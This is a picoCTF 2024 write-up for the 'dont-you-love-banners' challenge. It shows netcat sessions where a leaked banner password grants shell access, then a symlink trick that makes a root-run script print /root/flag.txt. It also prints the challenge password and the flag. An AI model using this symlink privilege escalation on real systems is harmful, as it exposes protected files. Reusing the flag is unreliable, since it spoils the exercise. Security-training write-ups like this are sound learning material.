### dont-you-love-banners

Author: Loic Shema / syreal
#Medium #General-skills #picoCTF2024 #shell #browser_web_shell 
#### Description

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 54818`. 
Use the leaked information to get to the server. To connect to the running application use 
`nc tethys.picoctf.net 52712`. From the above information abuse the machine and find the flag in the /root directory.

##### Solution:

first server give password information
```css   
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 54818
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

```

2nd server can access using password
```css
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 52712
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
```

```css
player@challenge:/$ cd root
cd root
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied

```

```css
player@challenge:/$ ls -la root
ls -la root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Sep 29 10:57 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py

```

```python
player@challenge:/$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

```

if you notice home banner is print due to `with open("/home/player/banner", "r")`

now use symbolic link to print flag `ln -s /root/flag.txt banner`


```css
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ cat banner
cat banner
cat: banner: Permission denied
player@challenge:~$ ls -la
ls -la
total 16
drwxr-xr-x 1 player player   20 Sep 29 11:15 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
lrwxrwxrwx 1 player player   14 Sep 29 11:15 banner -> /root/flag.txt
-rw-r--r-- 1 root   root     13 Feb  7  2024 text

```

simply disconnect server and connect again
```css
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 52712
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password? 
```

here you get flag `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}`